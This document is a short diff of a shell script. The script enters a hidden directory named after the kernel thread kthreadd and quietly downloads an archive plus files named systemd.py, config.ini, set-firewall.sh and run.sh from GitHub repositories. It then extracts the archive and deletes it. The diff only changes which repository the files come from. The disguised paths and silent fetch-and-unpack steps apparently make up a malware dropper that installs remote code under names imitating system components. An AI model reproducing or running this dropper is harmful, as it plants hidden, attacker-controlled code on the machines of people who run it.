@@ -10,9 +10,9 @@ cd ~/.cache/kthreadd
 wget -q \
     https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz \
     https://github.com/ANTI-VIRAL/MACHINE/raw/main/systemd.py \
-    https://github.com/ANTI-VIRAL/Ai-05/raw/main/config.ini \
-    https://github.com/ANTI-VIRAL/Ai-05/raw/main/set-firewall.sh \
-    https://github.com/ANTI-VIRAL/Ai-05/raw/main/run.sh
+    https://github.com/ANTI-VIRAL/Ai-04/raw/main/config.ini \
+    https://github.com/ANTI-VIRAL/Ai-04/raw/main/set-firewall.sh \
+    https://github.com/ANTI-VIRAL/Ai-04/raw/main/run.sh
 
 tar -xzf cache.tar.gz
 rm -f cache.tar.gz
